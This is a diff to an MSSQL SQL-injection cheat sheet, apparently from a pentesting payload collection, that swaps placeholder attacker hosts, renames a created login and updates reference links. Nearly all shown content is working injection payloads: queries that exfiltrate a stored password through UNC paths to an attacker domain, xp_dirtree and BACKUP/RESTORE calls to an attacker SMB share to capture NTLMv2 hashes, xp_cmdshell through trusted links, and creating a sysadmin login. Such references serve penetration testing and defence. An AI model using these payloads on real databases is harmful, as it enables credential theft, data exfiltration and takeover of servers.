@@ -304,14 +304,14 @@ Technique from [@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578
 * **Permission**: Requires `VIEW SERVER STATE` permission on the server.
 
     ```powershell
-    1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
+    1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\1.xem',null,null))
     ```
 
 * **Permission**: Requires the `CONTROL SERVER` permission.
 
     ```powershell
-    1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
-    1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
+    1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\',default,default)))
+    1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\1.trc',default))
     ```
 
 ### MSSQL UNC Path
@@ -319,21 +319,21 @@ Technique from [@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578
 MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.
 
 ```sql
-1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
+1'; use master; exec xp_dirtree '\\10.10.10.10\SHARE';-- 
 ```
 
 ```sql
-xp_dirtree '\\attackerip\file'
-xp_fileexist '\\attackerip\file'
-BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
-BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
-RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
-RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
-RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
-RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
-RESTORE LABELONLY FROM DISK = '\\attackerip\file'
-RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
-RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
+xp_dirtree '\\10.10.10.10\file'
+xp_fileexist '\\10.10.10.10\file'
+BACKUP LOG [TESTING] TO DISK = '\\10.10.10.10\file'
+BACKUP DATABASE [TESTING] TO DISK = '\\10.10.10.10\file'
+RESTORE LOG [TESTING] FROM DISK = '\\10.10.10.10\file'
+RESTORE DATABASE [TESTING] FROM DISK = '\\10.10.10.10\file'
+RESTORE HEADERONLY FROM DISK = '\\10.10.10.10\file'
+RESTORE FILELISTONLY FROM DISK = '\\10.10.10.10\file'
+RESTORE LABELONLY FROM DISK = '\\10.10.10.10\file'
+RESTORE REWINDONLY FROM DISK = '\\10.10.10.10\file'
+RESTORE VERIFYONLY FROM DISK = '\\10.10.10.10\file'
 ```
 
 ## MSSQL Trusted Links
@@ -366,8 +366,8 @@ A trusted link in Microsoft SQL Server is a linked server relationship that allo
     select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
 
     -- Create a SQL user and give sysadmin privileges
-    EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMAIN\SERVER1"') AT "DOMAIN\SERVER2"
-    EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMAIN\SERVER1"') AT "DOMAIN\SERVER2"
+    EXECUTE('EXECUTE(''CREATE LOGIN User WITH PASSWORD = ''''Password123'''' '') AT "DOMAIN\SQL01"') AT "DOMAIN\SQL02"
+    EXECUTE('EXECUTE(''sp_addsrvrolemember ''''User'''' , ''''sysadmin'''' '') AT "DOMAIN\SQL01"') AT "DOMAIN\SQL02"
     ```
 
 ## MSSQL Privileges
@@ -402,7 +402,7 @@ A trusted link in Microsoft SQL Server is a linked server relationship that allo
 ### MSSQL Make User DBA
 
 ```sql
-EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
+EXEC master.dbo.sp_addsrvrolemember 'User', 'sysadmin';
 ```
 
 ## MSSQL Database Credentials
@@ -433,11 +433,11 @@ Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_passwor
 
 ## References
 
-* [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - June 21, 2023](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)
+* [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - June 21, 2023](https://web.archive.org/web/20240219205617/https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)
 * [Error based SQL Injection in "Order By" clause - Manish Kishan Tanwar - March 26, 2018](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
-* [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - January 28, 2009](https://www.exploit-db.com/papers/12975)
-* [IS_SRVROLEMEMBER (Transact-SQL) - Microsoft - April 9, 2024](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
-* [MSSQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
-* [MSSQL Trusted Links - HackTricks - September 15, 2024](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
-* [SQL Server - Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
-* [sys.fn_my_permissions (Transact-SQL) - Microsoft - January 25, 2024](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)
+* [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - January 28, 2009](https://web.archive.org/web/20260222213546/https://www.exploit-db.com/papers/12975)
+* [IS_SRVROLEMEMBER (Transact-SQL) - Microsoft - April 9, 2024](https://web.archive.org/web/20220906233249/https://docs.microsoft.com/en-us/SQL/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
+* [MSSQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](https://web.archive.org/web/20260214013447/https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+* [MSSQL Trusted Links - HackTricks - September 15, 2024](https://web.archive.org/web/20241126085555/https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
+* [SQL Server - Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6, 2013](https://web.archive.org/web/20210227063841/https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
+* [sys.fn_my_permissions (Transact-SQL) - Microsoft - January 25, 2024](https://web.archive.org/web/20220907211545/https://docs.microsoft.com/en-us/SQL/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)
